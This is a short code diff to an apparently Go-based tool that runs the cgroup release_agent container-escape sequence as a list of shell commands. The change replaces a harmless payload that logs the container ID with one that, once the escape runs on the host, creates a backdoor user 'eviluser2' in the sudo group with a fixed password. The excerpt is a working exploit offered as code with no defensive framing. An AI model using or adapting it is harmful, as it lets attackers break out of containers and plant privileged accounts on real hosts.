@@ -45,9 +45,9 @@ func main() {
 		commands := [][]string{
 			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
 			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
-			{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
+			//{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
+			{"sh", "-c", `echo '#!/bin/sh\n/usr/sbin/useradd -G sudo eviluser2\necho "eviluser2:evil1234" | /usr/sbin/chpasswd' > /cmd && chmod +x /cmd`},
 			{"sh", "-c", `echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
-			{"sh", "-c", `echo 0 > /tmp/cgrp/x/cgroup.procs`},
 			{"sh", "-c", `echo \$\$ > /tmp/cgrp/x/cgroup.procs`},
 		}
 		for _, cmd := range commands {
